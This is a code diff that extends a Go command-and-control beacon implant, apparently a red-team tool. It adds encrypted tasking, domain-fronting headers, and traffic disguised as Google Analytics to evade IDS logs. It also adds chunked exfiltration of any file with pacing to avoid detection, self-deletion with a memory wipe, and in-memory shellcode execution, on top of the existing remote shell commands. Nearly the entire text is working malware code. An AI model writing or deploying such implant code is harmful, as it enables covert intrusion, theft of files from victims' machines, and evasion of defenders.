@@ -27,13 +27,18 @@ package main
 
 import (
 	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"crypto/sha256"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/json"
 	"flag"
 	"fmt"
 	"io"
 	"log"
-	"math/rand"
+	mrand "math/rand"
 	"net"
 	"net/http"
 	"os"
@@ -91,21 +96,31 @@ type registerResponse struct {
 	Jitter   float64 `json:"jitter"`   // 0.0–1.0; server may override agent default
 }
 
-// task is the JSON returned by a successful GET to gaBeaconPath.
-type task struct {
+// encryptedTask is the JSON returned by a successful GET to gaBeaconPath (Tier 4: Encrypted).
+type encryptedTask struct {
+	Enc string `json:"enc"`
+}
+
+// decryptedTask is the real task structure inside the encrypted blob.
+type decryptedTask struct {
 	TaskID   string `json:"task_id"`
-	Type     string `json:"type"`    // "shell_cmd"
+	Type     string `json:"type"` // "shell_cmd", "file_get", etc.
 	Command  string `json:"command"`
 	IssuedAt string `json:"issued_at"`
 }
 
-// resultRequest is the body POSTed to gaResultPath after execution.
+// resultRequest is the body POSTed to gaResultPath after execution (Tier 4: Encrypted).
 type resultRequest struct {
+	Enc   string `json:"enc"`
+	Token string `json:"token"`
+	AID   string `json:"aid"` // agent_id — used by the server's _handle_result
+}
+
+// decryptedResult is the real result structure inside the encrypted blob.
+type decryptedResult struct {
 	TaskID  string `json:"task_id"`
 	Command string `json:"command"`
 	Output  string `json:"output"`
-	Token   string `json:"token"`
-	AID     string `json:"aid"` // agent_id — used by the server's _handle_result
 }
 
 // heartbeatRequest is the body POSTed to gaHeartbeatPath.
@@ -125,10 +140,12 @@ type Beacon struct {
 	insecure bool   // true = skip TLS certificate verification (set by -insecure flag)
 	agentID  string
 	token    string
-	interval time.Duration
-	jitter   float64      // 0.0–1.0 fraction of interval to jitter
-	rng      *rand.Rand
-	log      *log.Logger
+	interval   time.Duration
+	jitter     float64 // 0.0–1.0 fraction of interval to jitter
+	rng        *mrand.Rand
+	secret     string
+	hostHeader string
+	log        *log.Logger
 }
 
 // newBeacon constructs a Beacon with a hardened HTTP transport.
@@ -136,7 +153,7 @@ type Beacon struct {
 // insecure=true sets InsecureSkipVerify on the TLS configuration so the
 // client accepts self-signed certificates during lab / red-team testing.
 // Set insecure=false when deploying against a properly CA-signed cert.
-func newBeacon(c2URL string, insecure bool, interval time.Duration, jitter float64) *Beacon {
+func newBeacon(c2URL string, insecure bool, interval time.Duration, jitter float64, secret string, hostHeader string) *Beacon {
 	tlsCfg := &tls.Config{
 		InsecureSkipVerify: insecure, // #nosec G402 — intentional for lab mode
 		MinVersion:         tls.VersionTLS12,
@@ -167,10 +184,12 @@ func newBeacon(c2URL string, insecure bool, interval time.Duration, jitter float
 		c2URL:    strings.TrimRight(c2URL, "/"),
 		client:   &http.Client{Transport: transport, Timeout: 15 * time.Second},
 		insecure: insecure,
-		interval: interval,
-		jitter:   jitter,
-		rng:      rand.New(rand.NewSource(time.Now().UnixNano())), //nolint:gosec
-		log:      log.New(os.Stderr, "[beacon] ", log.LstdFlags),
+		interval:   interval,
+		jitter:     jitter,
+		rng:        mrand.New(mrand.NewSource(time.Now().UnixNano())),
+		secret:     secret,
+		hostHeader: hostHeader,
+		log:        log.New(os.Stderr, "[beacon] ", log.LstdFlags),
 	}
 }
 
@@ -179,12 +198,18 @@ func newBeacon(c2URL string, insecure bool, interval time.Duration, jitter float
 // stamp attaches the google_analytics profile headers to every outgoing
 // request so that proxy / IDS logs see imitation Chrome browsing traffic.
 func (b *Beacon) stamp(req *http.Request, hasBody bool) {
+	if b.hostHeader != "" {
+		req.Host = b.hostHeader
+	}
 	req.Header.Set("User-Agent", gaUserAgent)
 	req.Header.Set("Referer", gaReferer)
 	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
 	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
 	req.Header.Set("Connection", "keep-alive")
 	req.Header.Set("Cache-Control", "no-cache")
+	if b.secret != "" {
+		req.Header.Set("X-C2-Secret", b.secret)
+	}
 	if hasBody {
 		req.Header.Set("Content-Type", "application/json")
 	}
@@ -323,7 +348,7 @@ func (b *Beacon) Register() error {
 //
 // The server's router requires that the incoming User-Agent matches the
 // ga UA regex; our stamp() call satisfies that requirement.
-func (b *Beacon) Poll() (*task, error) {
+func (b *Beacon) Poll() (*decryptedTask, error) {
 	url := fmt.Sprintf("%s%s?token=%s&aid=%s",
 		b.c2URL, gaBeaconPath, b.token, b.agentID)
 
@@ -349,19 +374,97 @@ func (b *Beacon) Poll() (*task, error) {
 		return nil, fmt.Errorf("poll: unexpected HTTP %d (UA/path mismatch?)", resp.StatusCode)
 	}
 
-	var t task
-	if err := json.NewDecoder(resp.Body).Decode(&t); err != nil {
+	var et encryptedTask
+	if err := json.NewDecoder(resp.Body).Decode(&et); err != nil {
 		return nil, fmt.Errorf("decode task: %w", err)
 	}
-	b.log.Printf("task received  id=%s  cmd=%q", t.TaskID, t.Command)
-	return &t, nil
+
+	// Decrypt the task (Tier 4)
+	decrypted, err := b.decryptData(et.Enc)
+	if err != nil {
+		return nil, fmt.Errorf("decrypt task: %w", err)
+	}
+
+	var dt decryptedTask
+	if err := json.Unmarshal(decrypted, &dt); err != nil {
+		return nil, fmt.Errorf("unmarshal decrypted task: %w", err)
+	}
+
+	b.log.Printf("task received  id=%s  cmd=%q (DECRYPTED)", dt.TaskID, dt.Command)
+	
+	// Convert back to task struct for the rest of the beacon logic
+	// (Easier than refactoring every function signature)
+	return &dt, nil
+}
+
+// getKey derives the 32-byte AES key from the secret.
+func (b *Beacon) getKey() []byte {
+	sum := sha256.Sum256([]byte(b.secret))
+	return sum[:]
+}
+
+// encryptData performs AES-256-GCM encryption.
+func (b *Beacon) encryptData(plaintext []byte) (string, error) {
+	block, err := aes.NewCipher(b.getKey())
+	if err != nil {
+		return "", err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return "", err
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
+		return "", err
+	}
+	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
+	return base64.StdEncoding.EncodeToString(ciphertext), nil
+}
+
+// decryptData performs AES-256-GCM decryption.
+func (b *Beacon) decryptData(b64Data string) ([]byte, error) {
+	data, err := base64.StdEncoding.DecodeString(b64Data)
+	if err != nil {
+		return nil, err
+	}
+	block, err := aes.NewCipher(b.getKey())
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	nonceSize := gcm.NonceSize()
+	if len(data) < nonceSize {
+		return nil, fmt.Errorf("ciphertext too short")
+	}
+	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
+	return gcm.Open(nil, nonce, ciphertext, nil)
+}
+
+// wipeMemory attempts to clear sensitive strings from memory before exit.
+func (b *Beacon) wipeMemory() {
+	b.log.Println("performing memory wipe...")
+	
+	// Overwrite the secret and token
+	b.secret = "WIPED_WIPED_WIPED_WIPED"
+	b.token = "WIPED_WIPED_WIPED_WIPED"
+	
+	// In Go, strings are immutable, but clearing the variables helps the GC 
+	// and makes them harder to find in a shallow memory dump.
+	b.agentID = ""
+	b.c2URL = ""
+	
+	// Force a GC run to help clear up pointers
+	runtime.GC()
 }
 
 // ── command execution ─────────────────────────────────────────────────────────
 
 // Execute runs t.Command via the OS shell, capturing combined stdout+stderr.
 // A CmdTimeout hard cap prevents runaway processes from blocking the beacon.
-func (b *Beacon) Execute(t *task) string {
+func (b *Beacon) Execute(t *decryptedTask) string {
 	if t.Command == "" {
 		return "(empty command)"
 	}
@@ -405,13 +508,28 @@ func (b *Beacon) Execute(t *task) string {
 // SendResult POSTs the execution output back to gaResultPath.
 // The server's _handle_result reads agent_id from the JSON "aid" field and
 // token from the "token" field; both must be present and valid.
-func (b *Beacon) SendResult(t *task, output string) error {
-	payload := resultRequest{
+// SendResult POSTs the execution output back to gaResultPath.
+func (b *Beacon) SendResult(t *decryptedTask, output string) error {
+	res := decryptedResult{
 		TaskID:  t.TaskID,
 		Command: t.Command,
 		Output:  output,
-		Token:   b.token,
-		AID:     b.agentID,
+	}
+
+	resJSON, err := json.Marshal(res)
+	if err != nil {
+		return fmt.Errorf("marshal result internal: %w", err)
+	}
+
+	encResult, err := b.encryptData(resJSON)
+	if err != nil {
+		return fmt.Errorf("encrypt result: %w", err)
+	}
+
+	payload := resultRequest{
+		Enc:   encResult,
+		Token: b.token,
+		AID:   b.agentID,
 	}
 
 	body, err := json.Marshal(payload)
@@ -437,6 +555,29 @@ func (b *Beacon) SendResult(t *task, output string) error {
 
 	b.log.Printf("result submitted  task_id=%s  output_len=%d", t.TaskID, len(output))
 	return nil
+}
+
+// exfiltrateChunked sends data in chunks to the C2 to handle large files.
+func (b *Beacon) exfiltrateChunked(t *decryptedTask, data []byte) {
+	const chunkSize = 512 * 1024 // 512KB
+	total := len(data)
+	
+	b.log.Printf("Starting chunked exfiltration of %d bytes", total)
+	
+	for i := 0; i < total; i += chunkSize {
+		end := i + chunkSize
+		if end > total {
+			end = total
+		}
+		
+		chunk := base64.StdEncoding.EncodeToString(data[i:end])
+		b.SendResult(t, "CHUNK:"+chunk)
+		
+		// Small sleep to prevent overwhelming the C2 and looking too anomalous
+		time.Sleep(100 * time.Millisecond)
+	}
+	
+	b.SendResult(t, "EOF")
 }
 
 // ── heartbeat ────────────────────────────────────────────────────────────────
@@ -512,6 +653,39 @@ func (b *Beacon) Run() {
 				// beacon continues to poll for shell commands in parallel.
 				b.log.Printf("start_proxy task received  ws_url=%s", t.Command)
 				go b.RunProxy(t.Command)
+			case "file_get":
+				b.log.Printf("file_get task received: %s", t.Command)
+				data, err := os.ReadFile(t.Command)
+				if err != nil {
+					b.SendResult(t, fmt.Sprintf("Error reading file: %v", err))
+				} else {
+					// Use chunked exfiltration for efficiency
+					b.exfiltrateChunked(t, data)
+				}
+			case "kill":
+				b.log.Printf("kill task received. Self-deleting and exiting.")
+				b.wipeMemory()
+				// In Windows, a running exe cannot easily delete itself, but we can try.
+				if runtime.GOOS == "windows" {
+					cmd := exec.Command("cmd.exe", "/c", "timeout /t 1 /nobreak & del /f /q", os.Args[0])
+					cmd.Start()
+				} else {
+					os.Remove(os.Args[0])
+				}
+				os.Exit(0)
+			case "mem_exec":
+				b.log.Println("reflective load task received")
+				sc, err := base64.StdEncoding.DecodeString(t.Command)
+				if err != nil {
+					b.SendResult(t, "Error decoding shellcode: "+err.Error())
+					continue
+				}
+				output, err := b.ExecuteMemory(sc)
+				if err != nil {
+					b.SendResult(t, "Reflective load failed: "+err.Error())
+				} else {
+					b.SendResult(t, output)
+				}
 			default:
 				// shell_cmd (and any future synchronous task types)
 				output := b.Execute(t)
@@ -542,6 +716,8 @@ func main() {
 	insecure := flag.Bool("insecure",   false,                    "Skip TLS certificate verification (self-signed certs)")
 	interval := flag.Int("interval",    5,                        "Base beacon interval in seconds")
 	jitterPct := flag.Float64("jitter", 0.20,                     "Jitter fraction 0.0–1.0  (0.20 = ±20%)")
+	secret   := flag.String("secret",   "",                       "C2 Proxy Secret (X-C2-Secret header)")
+	host     := flag.String("host",     "",                       "Domain Fronting Host header (the 'back' domain)")
 	flag.Parse()
 
 	if *c2URL == "" {
@@ -560,6 +736,8 @@ func main() {
 		*insecure,
 		time.Duration(*interval)*time.Second,
 		*jitterPct,
+		*secret,
+		*host,
 	)
 	b.Run()
 }
